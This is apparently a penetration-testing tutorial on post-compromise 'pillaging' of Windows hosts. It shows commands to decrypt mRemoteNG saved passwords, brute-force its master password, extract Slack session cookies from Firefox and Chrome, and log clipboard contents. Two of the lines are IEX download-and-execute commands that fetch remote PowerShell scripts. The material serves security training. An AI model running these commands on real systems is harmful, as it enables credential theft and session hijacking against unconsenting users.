
Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.


___


## Installed Applications

#### Identifying Common Applications

We can use `dir` or `ls` to check the content of `Program Files` and `Program Files (x86)` to find which applications are installed.

```
dir "C:\Program Files"
```

An alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs.

#### Get Installed Programs via PowerShell & Registry Keys

```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
```

```
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
```

```
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```



___


### mRemoteNG

`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`.

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

```
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

```
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```


### Attempt to Decrypt the Password with a Custom Password

```
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
```



___



## Abusing Cookies to Get Access to IM Clients

##### Cookie Extraction from Firefox

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

```
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

#### Extract Slack Cookie from Firefox Cookies Database

```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```


##### Cookie Extraction from Chromium-based Browsers

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

```
Invoke-SharpChromium -Command "cookies slack.com"
```

If we get an error :

#### Copy Cookies to SharpChromium Expected Location

```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.

```
Invoke-SharpChromium -Command "cookies slack.com"
```

We can now use this cookie with cookie-editor as we did with Firefox.

**Note:** When copy/pasting the contents of a cookie, make sure the value is one line.


____


## Clipboard

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

```
Invoke-ClipboardLogger
```

